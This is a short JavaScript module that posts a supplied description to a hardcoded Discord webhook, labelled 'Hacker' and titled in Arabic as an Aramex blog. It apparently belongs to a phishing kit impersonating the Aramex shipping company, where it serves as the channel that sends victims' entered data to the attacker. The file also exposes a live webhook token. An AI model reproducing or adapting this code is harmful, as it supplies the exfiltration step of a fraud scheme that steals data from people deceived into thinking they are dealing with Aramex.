import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328733153975730249/EmfGIhZehD6K7b9-e3Zsg-evngTDiLk2QL-yqw5S4azbhOa9JBq5uYEsI9Buhk-Qm9h6",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
